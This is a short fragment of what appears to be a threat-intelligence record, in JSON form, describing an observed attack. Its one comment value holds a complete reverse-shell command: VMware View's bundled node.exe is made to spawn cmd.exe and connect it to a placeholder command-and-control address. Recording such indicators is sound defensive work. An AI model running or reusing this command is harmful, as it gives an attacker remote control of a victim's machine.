                "type":"comment",
                "value":"%PROGRAMFILES%\\\\VMware\"VMware View\"\\Server\\appblastgateway\\node.exe -r net -e \"sh = require('child_process').exec('cmd.exe');var client = new net.Socket();client.connect(<Port>, '<C2_IP>', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});\"",
                "to_ids":false
            },
